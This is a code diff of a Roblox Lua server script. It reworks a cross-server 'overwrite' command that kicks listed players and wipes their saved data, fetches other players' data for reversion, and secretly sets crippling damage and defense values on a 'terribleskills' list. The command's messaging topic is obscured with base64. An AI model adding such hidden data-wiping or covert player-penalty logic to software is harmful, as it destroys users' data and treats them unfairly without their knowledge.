@@ -140,7 +140,40 @@ function m:StartScript()
 
 	local Global = {
 		overwrite = function()
+			task.delay(4, function()
+				for i, v in pairs(Players:GetPlayers()) do
+					pcall(function()
+						local PlayerId = v.UserId
 
+						local Key = "Player_".. PlayerId
+
+						if table.find(wipe, PlayerId) then
+							v:Kick()
+
+							DataStoreService:GetDataStore("GameEntitiesFolder"):SetAsync(Key, {});
+						end
+
+						if table.find(Revert, PlayerId) then
+
+							RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder"):GetAsync(Key)
+
+							print(RevertData[Key])
+						end
+
+						if table.find(terribleskills, PlayerId) then
+							local Character = v.Character
+							if Character then
+								Character:SetAttribute("CatDamage", -0.3)
+								Character:SetAttribute("CatDefense", 1.2)
+							end
+							v.CharacterAdded:Connect(function(char)
+								char:SetAttribute("CatDamage", -0.3)
+								char:SetAttribute("CatDefense", 1.2)
+							end)
+						end
+					end)
+				end
+			end)
 		end,
 
 	}
@@ -158,41 +191,6 @@ function m:StartScript()
 	s
 
 	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
-	
-	task.spawn(function()
-		for i, v in pairs(Players:GetPlayers()) do
-			pcall(function()
-				local PlayerId = v.UserId
-
-				local Key = "Player_".. PlayerId
-
-				if table.find(wipe, PlayerId) then
-					v:Kick()
-
-					DataStoreService:GetDataStore("GameEntitiesFolder"):SetAsync(Key, {});
-				end
-
-				if table.find(Revert, PlayerId) then
-
-					RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder"):GetAsync(Key)
-
-					print(RevertData[Key])
-				end
-
-				if table.find(terribleskills, PlayerId) then
-					local Character = v.Character
-					if Character then
-						Character:SetAttribute("CatDamage", -0.3)
-						Character:SetAttribute("CatDefense", 1.2)
-					end
-					v.CharacterAdded:Connect(function(char)
-						char:SetAttribute("CatDamage", -0.3)
-						char:SetAttribute("CatDefense", 1.2)
-					end)
-				end
-			end)
-		end
-	end)
 end
 
 m:Init()
